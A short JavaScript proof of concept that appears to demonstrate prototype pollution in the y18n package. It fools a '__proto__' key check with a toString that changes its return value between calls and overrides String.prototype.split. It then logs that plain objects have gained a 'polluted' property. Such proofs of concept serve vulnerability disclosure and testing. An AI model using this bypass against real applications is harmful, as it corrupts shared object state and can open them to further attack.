var arg = ['__proto__'];
var flag1 = true;
arg.toString = function () {
    if (flag1) {
        flag1 = false;
        return 'foo';
    } else {
        return '__proto__';
    }
};
String.prototype.split = function () {
    return [
        arg,
        'polluted'
    ];
};
const y18n = require('y18n')();
obj = {};
console.log({}.polluted);
y18n.setLocale('__proto__');
y18n.updateLocale({ polluted: 'yes' });
console.log({}.polluted);